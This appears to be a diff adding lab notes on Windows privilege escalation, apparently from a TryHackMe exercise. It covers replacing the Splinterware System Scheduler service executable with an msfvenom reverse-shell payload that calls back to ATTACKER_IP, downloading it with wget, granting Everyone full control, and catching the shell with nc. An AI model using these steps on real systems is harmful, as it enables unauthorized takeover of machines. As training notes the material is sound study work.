@@ -46,4 +46,21 @@ via AlwaysInstallElevated
 3. (Target machine) C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 
 
+via Insecure Permissions on Service Executable (vulnerability found on Splinterware System Scheduler)
+
+1. sc qc WindowsScheduler to check path name and service start name
+2. icacls C:\PROGRA~2\SYSTEM~1\WService.exe check permissions
+3. (Attacker Machine) msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe to generate payload
+4. (Attacker Machine) python -m http.server to serve the payload
+5. wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe to download payload
+6. cd C:\PROGRA~2\SYSTEM~1\
+7. move WService.exe WService.exe.bkp (test/replace the executable)
+8. move C:\Users\thm-unpriv\rev-svc.exe WService.exe (replace the executable with the payload)
+9. icacls WService.exe /grant Everyone:F to grant permission to everyone
+10. (Attacker Machine) nc -lvp 4445 to start listener
+11. C:\> sc stop windowsscheduler and C:\> sc start windowsscheduler
+12. this should spin up the reverse shell
+
+
+
 
